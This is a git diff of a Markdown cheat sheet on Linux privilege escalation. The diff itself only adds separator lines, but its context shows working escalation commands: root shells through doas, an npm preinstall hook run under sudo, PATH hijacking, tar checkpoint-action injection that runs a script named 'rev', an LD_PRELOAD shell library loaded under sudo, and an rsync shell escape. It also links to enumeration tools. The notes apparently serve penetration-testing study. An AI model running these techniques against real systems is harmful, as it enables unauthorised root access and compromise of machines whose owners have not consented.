@@ -23,12 +23,14 @@ What IPv6 address should be used? (CIDR subnet notation, “auto” or “none�
 Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
 ubuntu@ajkavanagh-bionic-test:~$ lxc storage list
 ```
+---
 #### with doas
 
 ```bash
 doas -u root openssl enc -in file
 doas -u root /bin/bash
 ```
+---
 #### with npm -u
 
 ```bash
@@ -36,6 +38,7 @@ mkdir ~/tmp
 echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
 sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
 ```
+---
 #### PATH
 
 ```bash
@@ -45,6 +48,7 @@ export PATH=/tmp:$PATH
 ./app_that_calls_curl
 ```
 
+---
 #### tar
 
 ```bash
@@ -58,6 +62,7 @@ echo "" > "/home/andre/backup/--checkpoint=1"
 echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
 chmod +x rev
 ```
+---
 #### env_keep += LD_PRELOAD
 
 ```bash
@@ -76,10 +81,12 @@ EOF
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
 ```
+---
 #### doas
 ```
 doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 ```
+---
 #### links
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 * [linEnum](https://github.com/rebootuser/LinEnum)
@@ -90,3 +97,4 @@ doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
 * [GTFOBins (unix)](https://gtfobins.github.io/)
 * [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [linux backdoors](./linux_backdoors.md)
+---
